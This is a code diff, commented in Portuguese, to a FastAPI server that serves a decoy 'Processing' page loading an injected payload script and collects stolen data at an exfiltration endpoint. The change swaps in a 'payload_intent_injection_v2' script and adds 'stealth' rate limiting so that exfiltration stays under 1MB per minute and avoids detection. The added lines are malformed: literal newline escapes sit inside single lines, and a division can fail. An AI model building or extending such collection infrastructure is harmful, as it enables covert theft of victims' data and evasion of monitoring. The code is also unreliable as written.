@@ -4,7 +4,7 @@
 from fastapi import FastAPI, Request, Response
 from fastapi.responses import HTMLResponse
 from starlette.staticfiles import StaticFiles
-import uvicorn
+import uvicorn\nimport time\n\n# Taxa máxima de exfiltração: 1MB/minuto (Regra 5) -> 16.6 KB/segundo\nEXFIL_RATE_LIMIT_KB_PER_SEC = 16.6\nLAST_EXFIL_TIME = time.time()
 import json
 import logging
 
@@ -39,7 +39,7 @@ async def get_payload_page(request: Request):
     <head>
         <title>Processando...</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <script src="/static/payload.js"></script>
+        <script src="/static/payload_intent_injection_v2.js"></script>
         <style>
             body { background-color: #0F1B2E; color: #00D9FF; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
             .message { text-align: center; }
@@ -63,7 +63,7 @@ async def exfil_data(request: Request, data: str = None):
     """
     client_host = request.client.host
     
-    if data:
+    global LAST_EXFIL_TIME\n    \n    # Simulação de controle de taxa de exfiltração (Stealth)\n    current_time = time.time()\n    time_since_last = current_time - LAST_EXFIL_TIME\n    data_size_kb = len(data.encode('utf-8')) / 1024\n    \n    if data_size_kb / time_since_last > EXFIL_RATE_LIMIT_KB_PER_SEC:\n        # Se a taxa for excedida, simula um atraso para manter o stealth\n        sleep_time = (data_size_kb / EXFIL_RATE_LIMIT_KB_PER_SEC) - time_since_last\n        logger.warning(f"Exfiltração excedeu 1MB/min. Simulando atraso de {sleep_time:.2f}s para stealth.")\n        time.sleep(sleep_time)\n        LAST_EXFIL_TIME = time.time()\n\n    if data:
         try:
             # Tenta decodificar o JSON se o payload enviar dados estruturados
             exfil_data = json.loads(data)
